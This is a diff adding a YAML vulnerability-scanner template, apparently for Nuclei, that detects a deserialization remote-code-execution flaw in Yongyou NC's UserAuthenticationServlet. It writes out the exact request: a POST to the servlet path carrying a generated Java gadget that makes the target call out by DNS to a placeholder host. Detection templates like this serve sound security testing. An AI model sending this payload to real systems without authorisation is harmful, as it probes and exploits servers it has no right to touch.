@@ -1,0 +1,27 @@
+id: poc-yaml-yongyou-userauthenticationservlet-deserialization-rce
+
+info:
+  name: Yongyou NC UserAuthenticationServlet Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,rce
+  description: |
+    Detects an RCE vulnerability in Yongyou NC system's UserAuthenticationServlet interface due to insecure deserialization.
+
+http:
+  - method: POST
+    path:
+      - "/servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet"
+    body: "{{generate_java_gadget('dns', 'http://xxx.xxxx.cn', 'raw')}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.util.HashMap"
+          - "java.lang.Boolean"
+          - "loadFactor"
+        part: body
